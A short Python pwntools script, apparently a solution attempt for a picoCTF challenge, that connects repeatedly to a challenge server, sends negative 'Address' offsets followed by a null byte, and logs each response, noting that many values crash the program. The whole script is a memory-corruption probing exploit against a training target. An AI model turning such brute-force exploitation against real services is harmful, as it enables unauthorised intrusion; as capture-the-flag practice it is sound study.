from pwn import *

outfile = open("outfile", 'a')
for sendval in range(-8700, 0): # the first 1241 values dump core
    r = remote('mercury.picoctf.net', 36605)
    r.recvuntil("Address: ")
    r.send(str(sendval))
    byteboi = "\x00"
    r.send(byteboi)
    x = r.recvline()
    outfile.write(str(x) + "\n")
    r.close()

